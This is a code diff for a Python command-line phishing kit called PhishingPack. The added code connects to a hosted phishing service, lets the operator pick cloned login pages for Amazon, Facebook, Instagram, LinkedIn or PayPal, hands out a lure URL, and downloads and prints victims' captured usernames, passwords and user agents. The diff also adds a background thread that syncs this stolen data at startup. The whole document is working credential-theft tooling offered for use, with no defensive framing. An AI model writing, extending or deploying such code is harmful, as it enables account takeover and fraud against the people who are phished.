@@ -11,6 +11,9 @@ from shutil import copy2
 from threading import Thread
 from socket import gethostbyname, gethostname
 from contextlib import redirect_stdout, redirect_stderr
+from getpass import getpass
+import requests
+
 
 console = Console(force_terminal=True)
 app = Flask(__name__)
@@ -18,6 +21,18 @@ app = Flask(__name__)
 hostname = gethostname()
 ip_address = gethostbyname(hostname)
 PORT = 5150
+
+API_URL = "https://phishingpackweb.onrender.com/api"
+WEB_URL = "https://phishingpackweb.onrender.com"
+default_web_templates = ["amazon", "facebook", "instagram", "linkedin", "paypal"]
+
+default_web_templates_string = """
+1. Amazon
+2. Facebook
+3. Instagram
+4. Linkedin
+5. Paypal
+"""
 
 help_string = """
 [bright_blue]Help usage for PhishingPack![/bright_blue]
@@ -33,15 +48,33 @@ help_string = """
 
 [magenta2]--> server start[/magenta2]: Start the phishing webserver for the selected site template.
 
-[magenta2]--> server stop[/magenta2]: Stops the currently running webserver if any.
+[magenta2]--> server stop[/magenta2]: Stop the currently running webserver if any.
 
-[magenta2]--> server status[/magenta2]: Tells if the webserver is running or not.
+[magenta2]--> server status[/magenta2]: Get the status of webserver.
 
 [magenta2]--> server monitor[/magenta2]: Monitor the currently running webserver for data from the victom.
 
 [magenta2]--> data display[/magenta2]: Display the data collected by the phishing webserver.
 
 [magenta2]--> data clear[/magenta2]: Clear the data collected by the phishing webserver.
+
+[magenta2]--> account status[/magenta2]: Get if you are logged in or not for PhishingPackWeb internet server.
+
+[magenta2]--> account login[/magenta2]: Login to the PhishingPackWeb internet server.
+
+[magenta2]--> account create[/magenta2]: Create a new account for PhishingPackWeb internet server.
+
+[magenta2]--> web status[/magenta2]: Get info about the PhishingPackWeb internet server included template and more.
+
+[magenta2]--> web template set[/magenta2]: Set or change the template for PhishingPackWeb internet server.
+
+[magenta2]--> web template remove[/magenta2]: Remove the template of PhishingPackWeb internet server.
+
+[magenta2]--> web data display[/magenta2]: Display the captured data from PhishingPackWeb internet server.
+
+[magenta2]--> web data refresh[/magenta2]: Get the latest captured data from PhishingPackWeb internet server.
+
+[magenta2]--> web data clear[/magenta2]: Clear all the captured data from PhishingPackWeb internet server.
 
 [magenta2]--> help[/magenta2]: Display this help message.
 
@@ -235,6 +268,214 @@ def display_data():
             print("\n")
 
 
+def internet_connection():
+    try:
+        requests.get(API_URL, timeout=5)
+        return True
+    except requests.ConnectionError:
+        return False
+
+def save_user(user):
+    with open("config/user.json", "w") as f:
+        dump(user, f)
+
+def get_saved_user():
+    try:
+        with open("config/user.json", "r") as f:
+            return load(f)
+    except:
+        console.print("\nYou are not logged in.", style="yellow")
+        console.print("Use 'account login' to login or 'account create' to create a new account.\n")
+        return None
+
+def get_user_from_db():
+    user = get_saved_user()
+    if not user:
+        return None
+    response = requests.post(f"{API_URL}/authenticate", json={"username": user["username"], "password": user["password"]})
+    json = response.json()
+    if json.get("error"):
+        console.print("\nYour credentials in config/user.json are invalid.\n", style="red")
+        save_user({"username":"", "password":"", "template":"", "data":[]})
+        return None
+    return json["user"]
+
+def account_login(username, password):
+    if not internet_connection():
+        console.print(
+            "\nError! Please check your internet connection.\n", style="red bold"
+        )
+    elif len(username) < 4 or len(username) > 32:
+        console.print(
+            "\nError! Username must be between 4 and 32 characters.\n", style="red bold"
+        )
+    elif " " in username:
+        console.print("\nError! Username must not contain spaces.\n", style="red bold")
+    elif len(password) < 8:
+        console.print(
+            "\nError! Password must be atleast 8 characters long.\n", style="red bold"
+        )
+    else:
+        response = requests.post(
+            f"{API_URL}/authenticate", json={"username": username, "password": password}
+        )
+        json = response.json()
+        if json.get("error"):
+            console.print(f"\n{json["error"]}\n", style="red")
+        else:
+            console.print(f"\nLogged in as {json['user']['username']}!", style="green")
+            console.print(f"Your template url is '{WEB_URL}?t={json['user']['_id']}'")
+            console.print("Use 'web status' to check your template for PhishingPackWeb internet server.\n")
+            json["user"]["password"] = password
+            del json["user"]["_id"]
+            save_user(json["user"])
+
+
+def account_create(username, password):
+    if not internet_connection():
+        console.print(
+            "\nError! Please check your internet connection.\n", style="red bold"
+        )
+    elif len(username) < 4 or len(username) > 32:
+        console.print(
+            "\nError! Username must be between 4 and 32 characters.\n", style="red bold"
+        )
+    elif " " in username:
+        console.print("\nError! Username must not contain spaces.\n", style="red bold")
+    elif len(password) < 8:
+        console.print(
+            "\nError! Password must be atleast 8 characters long.\n", style="red bold"
+        )
+    else:
+        response = requests.post(
+            f"{API_URL}/add-user", json={"username": username, "password": password}
+        )
+        json = response.json()
+        if json.get("error"):
+            console.print(f"\n{json['error']}\n", style="red")
+        else:
+            console.print(f"\nCreated account as {json['user']['username']}!", style="green")
+            console.print(f"Your template url is '{WEB_URL}?t={json['user']['_id']}'")
+            console.print("Use 'web template set' to set the template for PhishingPackWeb internet server.\n")
+            json["user"]["password"] = password
+            del json["user"]["_id"]
+            save_user(json["user"])
+
+
+def account_status():
+    if not internet_connection():
+        console.print(
+            "\nError! Please check your internet connection.\n", style="red bold"
+        )
+        return
+
+    user = get_user_from_db()
+    if not user:
+        return
+    
+    console.print(f"\nYou are logged in as {user['username']}!\n", style="green")
+
+    
+def web_status():
+    if not internet_connection():
+        console.print(
+            "\nError! Please check your internet connection.\n", style="red bold"
+        )
+    else:
+        user = get_user_from_db()
+        if not user:
+            return
+        
+        console.print(f"\nYou are logged in as {user['username']}!", style="green")
+        if user["template"]:
+            console.print(f"Your template is '{user['template']}'")
+        else:
+            console.print("You have not set any template yet.")
+        console.print(f"Your template url is '{WEB_URL}?t={user['_id']}'\n")
+
+def web_template_set(template):
+    if not internet_connection():
+        console.print(
+            "\nError! Please check your internet connection.\n", style="red bold"
+        )
+    else:
+        user = get_user_from_db()
+        if not user:
+            return
+        
+        response = requests.post(
+            f"{API_URL}/set-template", json={"username": user["username"], "template": template}
+        )
+        json = response.json()
+        if json.get("error"):
+            console.print(f"\n{json['error']}\n", style="red")
+        else:
+            user = get_saved_user()
+            user["template"] = template
+            save_user(user)
+            if template=="":
+                console.print(f"\nTemplate removed!\n", style="green")
+            else:
+                console.print(f"\nTemplate set to '{template}'\n", style="green")
+
+def web_data_display():
+    user = get_saved_user()
+    if not user:
+        return
+    
+    all_data = user['data']
+    if len(all_data) == 0:
+        console.print("\nNo data has been collected yet from PhishingPackWeb.", style="red")
+        console.print("Use 'web data refresh' to get latest data.\n")
+    else:
+        console.print("\nDisplay all collected data:\n", style="yellow1 bold")
+        for data in all_data:
+            print(f"Site={data['site']}")
+            print(f"UserAgent={data['user_agent']}")
+            print(f"Time={data['time']}")
+            print(f"username={data['username']}")
+            print(f"password={data['password']}")
+            print("\n")
+
+def web_data_refresh():
+    if not internet_connection():
+        console.print(
+            "\nError! Please check your internet connection.\n", style="red bold"
+        )
+    else:
+        user = get_user_from_db()
+        if not user:
+            return
+        
+        saved_user = get_saved_user()
+        saved_user["data"] = user["data"]
+        save_user(saved_user)
+        console.print(f"\nLatest data has been fetched from the server.\n", style="green")
+
+
+def web_data_clear():
+    if not internet_connection():
+        console.print(
+            "\nError! Please check your internet connection.\n", style="red bold"
+        )
+    else:
+        user = get_user_from_db()
+        if not user:
+            return
+        
+        response = requests.post(
+            f"{API_URL}/clear-data", json={"username": user["username"]}
+        )
+        json = response.json()
+        if json.get("error"):
+            console.print(f"\n{json['error']}\n", style="red")
+        else:
+            user = get_saved_user()
+            user["data"] = []
+            save_user(user)
+            console.print(f"\nData has been cleared for your PhishingPackWeb server.\n", style="green")
+
+
 def check_for_files():
     try:
         with open("data.json", "r") as f:
@@ -251,6 +492,27 @@ def check_for_files():
         console.print("\nInvalid sites.json file.", style="red")
         console.print("Please check the file and try again.", style="yellow bold")
         exit()
+
+def web_server():
+    """Create valid user.json if any error and fetches the latest data from the PhishingPackWeb server."""
+
+    if internet_connection():
+        try:
+            with open("config/user.json", "r") as f:
+                user =  load(f)
+            response = requests.post(f"{API_URL}/authenticate", json={"username": user["username"], "password": user["password"]})
+            json = response.json()
+
+            if json.get("success"):
+                user["data"] = json["user"]["data"]
+                with open("config/user.json", "w") as f:
+                    dump(user, f)
+            else:
+                with open("config/user.json", "w") as f:
+                    dump({"username":"", "password":"", "template":"", "data":[]}, f)
+        except:
+            with open("config/user.json", "w") as f:
+                dump({"username":"", "password":"", "template":"", "data":[]}, f)
 
 
 def main():
@@ -349,6 +611,31 @@ def main():
             with open("data.json", "w") as f:
                 dump([], f)
             console.print("\nData has been cleared.\n", style="green")
+        elif command == "account status":
+            account_status()
+        elif command == "account login":
+            username = input("\nEnter your username: ")
+            password = getpass("Enter your password (will not display for security): ")
+            account_login(username, password)
+        elif command == "account create":
+            username = input("\nEnter your username (with no spaces): ")
+            password = getpass("Enter your password (will not display for security): ")
+            account_create(username, password)
+        elif command == "web status":
+            web_status()
+        elif command == "web template set":
+            console.print("\nSelect one of the following templates:", style="yellow1")
+            console.print(default_web_templates_string, style="sea_green1")
+            template = input("\nSelect the template: ")
+            web_template_set(default_web_templates[int(template)-1])
+        elif command == "web template remove":
+            web_template_set("")
+        elif command == "web data display":
+            web_data_display()
+        elif command == "web data refresh":
+            web_data_refresh()
+        elif command == "web data clear":
+            web_data_clear()
         else:
             console.print("\nCommand not found. Type 'help' for help.\n", style="red")
 
@@ -402,5 +689,6 @@ if __name__ == "__main__":
 
     check_for_files()
 
+    Thread(target=web_server, daemon=True).start()
     server_process = Process(target=start_flask_server)
     start()
